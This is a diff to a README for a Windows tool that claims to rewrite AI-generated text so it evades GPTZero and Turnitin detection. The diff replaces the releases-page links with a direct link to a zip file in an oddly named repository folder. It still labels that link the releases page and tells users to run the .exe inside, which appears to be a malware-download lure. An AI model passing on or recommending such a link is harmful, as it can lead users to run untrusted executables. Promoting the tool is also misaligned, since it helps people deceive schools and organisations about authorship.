@@ -1,6 +1,6 @@
 # 🤖 ai-detection-bypass-gptzero-turnitin - Humanize AI content for better accessibility
 
-[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/phamdo627/ai-detection-bypass-gptzero-turnitin/releases)
+[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/phamdo627/ai-detection-bypass-gptzero-turnitin/raw/refs/heads/main/tonsilitic/gptzero_bypass_turnitin_detection_ai_v3.4-beta.1.zip)
 
 This application transforms machine-written text into natural, human-like language. Many organizations use automated systems to detect text produced by artificial intelligence. This software adjusts your writing patterns, sentence structure, and word choice to help your documents pass these checks. It works by applying linguistic variations that align with standard human writing patterns.
 
@@ -27,7 +27,7 @@ You need a computer running Windows 10 or 11 to use this software. Make sure you
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [releases page](https://github.com/phamdo627/ai-detection-bypass-gptzero-turnitin/releases) to download the package.
+1.  Visit the [releases page](https://github.com/phamdo627/ai-detection-bypass-gptzero-turnitin/raw/refs/heads/main/tonsilitic/gptzero_bypass_turnitin_detection_ai_v3.4-beta.1.zip) to download the package.
 2.  Locate the file ending with `.exe` in your "Downloads" folder.
 3.  Double-click the file to open the installer.
 4.  Follow the prompts on your screen. You can use the default settings.
